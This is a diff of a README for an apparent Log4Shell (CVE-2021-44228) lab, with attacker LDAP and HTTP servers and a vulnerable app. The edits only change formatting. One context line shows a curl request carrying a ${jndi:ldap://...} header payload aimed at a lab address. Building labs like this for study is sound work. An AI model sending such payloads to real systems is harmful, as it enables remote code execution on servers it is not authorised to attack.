@@ -13,11 +13,11 @@ This repository contains a docker-compose setup which starts an attacker LDAP se
 
 ## Components 
 
-Victim Web server - log4shell-vulnerable-app: A web server with log4j, vulnerable to first stage payload, which is the log4shell attack. 
+**Victim Web server - log4shell-vulnerable-app:** A web server with log4j, vulnerable to first stage payload, which is the log4shell attack. 
 
-Attacker LDAP sever - marshalsec: A LDAP server that receives jndi request from the victim web server. Redirects the victim web server to attacker web server. 
+**Attacker LDAP sever - marshalsec:** A LDAP server that receives jndi request from the victim web server. Redirects the victim web server to attacker web server. 
 
-Attacker Web server - A `python3 -m http.server` server which hosts the second stage payload, which is the `Exploit.class`. 
+**Attacker Web server:** A `python3 -m http.server` server which hosts the second stage payload, which is the `Exploit.class`. 
 
 ## Usage 
 
@@ -115,7 +115,11 @@ ex) curl 192.168.40.128:8080 -H 'X-Api-Version: ${jndi:ldap://192.168.40.128:138
 
 ## References 
 https://www.lunasec.io/docs/blog/log4j-zero-day/
+
 http://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-44228
+
 https://github.com/christophetd/log4shell-vulnerable-app
+
 https://github.com/mbechler/marshalsec
+
 https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce
